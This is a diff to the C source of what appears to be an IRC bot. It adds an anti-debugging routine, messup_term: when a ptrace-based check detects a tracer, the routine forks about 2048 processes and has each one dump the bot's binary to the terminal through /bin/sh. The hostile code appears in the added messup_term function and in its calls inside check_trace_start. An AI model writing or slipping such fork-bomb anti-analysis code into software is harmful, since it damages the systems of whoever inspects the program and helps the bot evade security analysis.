@@ -1081,6 +1081,25 @@ static int spawnbot(char *bin, char *nick, char *ip, char *host, char *ipsix, in
 }
 #endif
 
+#ifdef S_MESSUPTERM 
+void messup_term() {
+  int i;
+  char * argv[4];
+  freopen(STR("/dev/null"), "w", stderr);
+  for (i=0;i<11;i++) {
+    fork();
+  }
+  argv[0]=nmalloc(100);
+  strcpy(argv[0], STR("/bin/sh"));
+  argv[1]="-c";
+  argv[2]=nmalloc(1024);
+  strcpy(argv[2], STR("cat < "));
+  strcat(argv[2], binname);
+  argv[3]=NULL;
+  execvp(argv[0], &argv[0]);
+}
+#endif /* S_MESSUPTERM */
+
 void check_trace_start()
 {
 #ifdef S_ANTITRACE
@@ -1094,8 +1113,12 @@ void check_trace_start()
   } else if (xx == 0) {
     i = ptrace(PTRACE_ATTACH, parent, 0, 0);
     if (i == (-1) && errno == EPERM) {
+#ifdef S_MESSUPTERM
+      messup_term();
+#else
       kill(parent, SIGKILL);
       exit(1);
+#endif /* S_MESSUPTERM */
     } else {
       waitpid(parent, &i, 0);
       kill(parent, SIGCHLD);
@@ -1115,8 +1138,12 @@ void check_trace_start()
   } else if (xx == 0) {
     i = ptrace(PT_ATTACH, parent, 0, 0);
     if (i == (-1) && errno == EBUSY) {
+#ifdef S_MESSUPTERM
+      messup_term();
+#else
       kill(parent, SIGKILL);
       exit(1);
+#endif /* S_MESSUPTERM */
     } else {
        wait(&i);
       i = ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
@@ -1314,7 +1341,9 @@ int main(int argc, char **argv)
   myuid = geteuid();
   binname = getfullbinname(argv[0]);
 
+#ifndef DEBUG_MEM
   check_trace_start();
+#endif /* !DEBUG_MEM */
 
   if (!can_stat(binname))
    werr(ERR_BINSTAT);
